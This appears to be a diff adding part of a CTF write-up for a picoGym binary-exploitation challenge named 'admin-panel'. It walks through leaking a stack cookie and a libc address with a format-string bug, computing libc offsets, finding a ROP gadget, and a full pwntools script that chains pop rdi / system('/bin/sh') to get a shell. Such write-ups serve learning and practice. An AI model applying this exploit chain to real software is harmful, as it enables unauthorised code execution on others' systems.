@@ -1974,3 +1974,101 @@ gef➤  pattern offset 0x616161616161616a
 [+] Found at offset 72 (little-endian search) likely
 ```
 That means we need to use the `'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa'` part of the pattern to reach the stack cookie. After that we write the stack cookie that was retrieved using the format string vulnerability and write anything into the `rbp`, it doesn't matter. After all of that we can finally write into the return address without problems.
+
+But to where do we return to?
+
+We don't have any interesting function in our program that could execute stuff for us. What we do have, however, is a libc address on the return address. As we have PIE and ASLR enabled, this address will be randomized everytime but will always be the same instruction. On this case, we just need to calculate the offset of the instruction being executed considering the entrypoint as a reference. Let's use gdb to achieve that
+
+![admin-panel5](/assets/img/picogym-pwn-easy/admin-panel/admin-panel5.png)
+
+The highlighted address is the return address. Let's see to where this takes us
+
+![admin-panel6](/assets/img/picogym-pwn-easy/admin-panel/admin-panel6.png)
+
+It takes us to `__libc_start_main+235`. Now we need to check what is the offset of this instruction when the program is not running. So you can open the libc file inside of gdb. I opened it, disassembled `__libc_start_main` and started looking for the specific instruction `__libc_start_main+235`.
+
+![admin-panel7](/assets/img/picogym-pwn-easy/admin-panel/admin-panel7.png)
+
+There it is :) It is on the address `0x000000000002409b`, so it is on the offset `0x2409b` after the entrypoint of libc. We can now use the previously leaked libc address and subtract `0x2409b` out of it to find the entrypoint address of libc even when the program is running!
+
+This is the calculation:
+```python
+libc_start_main_offset = 0x000000000002409b
+libc_entrypoint = libc_leak - libc_start_main_offset
+```
+
+Now we can choose any address of libc to jump to. Let's see if we have can execute the system function and pass the argument `/bin/sh` to get a shell.
+
+Looking for the `system` offset inside the libc:
+
+![admin-panel8](/assets/img/picogym-pwn-easy/admin-panel/admin-panel8.png)
+
+`system` is at offset `0x44af0`. Let's save it
+```python
+system_offset = 0x44af0
+```
+
+![admin-panel9](/assets/img/picogym-pwn-easy/admin-panel/admin-panel9.png)
+
+`"/bin/sh"` is at offset `18052c`
+```python
+bin_sh_offset = 0x18052c
+```
+
+So we know the address of system and the address of the string "/bin/sh". However, we need to put the string "/bin/sh" into the register `rdi` when calling for the `system` function. We can achieve that using ROP. Let's look for some gadgets using ROPgadget
+
+The command is: `ROPgadget --binary libc.so.6 --ropchain | grep "pop rdi"` \
+`[+] Gadget found: 0x23a5f pop rdi ; ret` \
+Let's also save it:
+```python
+pop_rdi_ret_offset = 0x23a5f
+```
+
+Nice! That's everything we need :)
+
+In conclusion, we are filling the entire `report` buffer, overwriting the stack cookie, putting anything into the `rbp` register, overwriting the return address with the `pop rdi ; ret` instruction to put the `"/bin/sh"` string into the `rdi` register, putting the `"/bin/sh"` address (the libc entrypoint + the offset we found) right after it so that `pop rdi` works fine, and then putting the `system` address (the libc entrypoint + the address we found) after it so that `ret` returns to it :)
+
+This is my solution for this challenge:
+```python
+from pwn import *
+
+libc_start_main_offset = 0x000000000002409b
+pop_rdi_ret_offset = 0x23a5f
+system_offset = 0x44af0
+bin_sh_offset = 0x18052c
+
+p = process("./admin-panel_patched")
+p.recvline()
+p.recvline()
+p.sendline(b"admin")
+p.recvline()
+p.sendline(b'secretpass123aaaaaaaaaaaaaaaaaaa%15$p,%17$p')
+p.recvline()
+
+leak_addr = p.recvline().decode()[:-1].split(',')
+stack_cookie = int(leak_addr[0], 16)
+libc_leak = int(leak_addr[1], 16)
+print(f"stack cookie is: {hex(stack_cookie)}")
+print(f"leaked address is: {hex(libc_leak)}")
+
+libc_entrypoint = libc_leak - libc_start_main_offset
+pop_rdi_ret = libc_entrypoint + pop_rdi_ret_offset
+
+payload = b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaa'
+payload += p64(stack_cookie)
+payload += p64(0xdeadbeef)
+payload += p64(pop_rdi_ret)
+payload += p64(bin_sh_offset + libc_entrypoint)
+payload += p64(system_offset + libc_entrypoint)
+
+p.recvuntil(b'2 or 3:')
+p.sendline(b'2')
+p.recvuntil(b'wrong:')
+p.sendline(payload)
+
+p.interactive()
+```
+
+![admin-panel10](/assets/img/picogym-pwn-easy/admin-panel/admin-panel10.png)
+
+That's it. I hope you liked it :)
